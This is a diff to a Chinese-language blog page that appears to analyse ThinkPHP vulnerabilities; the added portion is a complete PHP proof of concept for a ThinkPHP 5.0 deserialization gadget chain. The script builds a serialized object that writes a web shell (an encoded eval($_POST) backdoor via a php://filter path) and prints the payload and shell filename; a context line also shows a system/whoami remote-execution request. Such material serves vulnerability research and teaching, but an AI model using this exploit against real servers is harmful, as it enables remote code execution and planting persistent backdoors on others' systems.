@@ -507,7 +507,168 @@ post:_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami
 var_dump($a);
 </code></pre><p>先放出网上的流程图</p>
 <p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/2dc39a74112c48508c685572e4395a36.png" alt="2dc39a74112c48508c685572e4395a36"></p>
-<pre tabindex="0"><code>\thinkphp\library\think\process\pipes\Windows.php
+<p>poc:</p>
+<pre tabindex="0"><code>&lt;?php
+
+namespace think\process\pipes;
+abstract class Pipes
+{
+}
+
+use think\model\Pivot;
+
+class Windows extends Pipes
+{
+    private $files = [];
+
+    function __construct()
+    {
+        $this-&gt;files = [new Pivot()];
+    }
+}
+
+namespace think;
+
+abstract class Model
+{
+    protected $append = [];
+    protected $error;
+    protected $parent;
+}
+
+namespace think\model;
+
+use think\Model;
+use think\console\Output;
+use think\model\relation\HasOne;
+
+class Pivot extends Model
+{
+    public $parent;
+
+    function __construct()
+    {
+        $this-&gt;append = [&#34;getError&#34; =&gt; &#34;getError&#34;];
+        $this-&gt;parent = new Output();
+        $this-&gt;error = new HasOne();
+    }
+}
+
+namespace think\db;
+
+use think\console\Output;
+
+class Query
+{
+    protected $model;
+
+    function __construct()
+    {
+        $this-&gt;model = new Output();
+    }
+}
+
+namespace think\model;
+abstract class Relation
+{
+    protected $selfRelation;
+    protected $query;
+}
+
+namespace think\model\relation;
+
+use think\model\Relation;
+
+abstract class OneToOne extends Relation
+{
+    protected $bindAttr = [];
+}
+
+use think\db\Query;
+
+class HasOne extends OneToOne
+{
+    function __construct()
+    {
+        $this-&gt;selfRelation = false;
+        $this-&gt;query = new Query();
+        $this-&gt;bindAttr = [1 =&gt; &#34;file&#34;];
+    }
+}
+
+namespace think\console;
+
+use  think\session\driver\Memcached;
+
+class Output
+{
+    private $handle = null;
+    protected $styles = [];
+
+    function __construct()
+    {
+        $this-&gt;handle = new Memcached();
+        $this-&gt;styles = [&#34;getAttr&#34;];
+    }
+}
+
+namespace think\session\driver;
+
+use think\cache\driver\File;
+
+class Memcached
+{
+    protected $handler = null;
+    protected $config = [];
+
+    function __construct()
+    {
+        $this-&gt;handler = new File();
+        $this-&gt;config = [
+            &#39;session_name&#39; =&gt; &#39;&#39;,
+            &#39;expire&#39; =&gt; null,
+        ];
+    }
+}
+
+
+namespace think\cache\driver;
+class File
+{
+    protected $options = [];
+    protected $tag;
+
+    function __construct()
+    {
+        $this-&gt;options = [
+            &#39;expire&#39; =&gt; 0,
+            &#39;cache_subdir&#39; =&gt; false,
+            &#39;prefix&#39; =&gt; &#39;&#39;,
+            &#39;path&#39;=&gt;&#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#39;,
+            &#39;data_compress&#39; =&gt; false,
+        ];
+        $this-&gt;tag = true;
+    }
+
+    public function get_filename()
+    {
+        $name = md5(&#39;tag_&#39; . md5($this-&gt;tag));
+        $filename = $this-&gt;options[&#39;path&#39;];
+        $pos = strpos($filename, &#34;/../&#34;);
+        $filename = urlencode(substr($filename, $pos + strlen(&#34;/../&#34;)));
+        return $filename . $name . &#34;.php&#34;;
+    }
+}
+
+
+use think\process\pipes\Windows;
+
+echo urlencode(serialize(new Windows()));#payload
+
+echo &#34;\n&#34;;
+$f = new File();
+echo $f-&gt;get_filename();#获取shell的文件名
+</code></pre><pre tabindex="0"><code>\thinkphp\library\think\process\pipes\Windows.php
 </code></pre><p>起点在<code>__destruct</code></p>
 <p><img src="https://gkjzjh146.github.io/thinkphp%E5%A4%A7%E6%9D%82%E7%83%A9.assets/image-20230806123403783.png" alt="image-20230806123403783"></p>
 <p>跟进<code>removeFiles</code>方法</p>
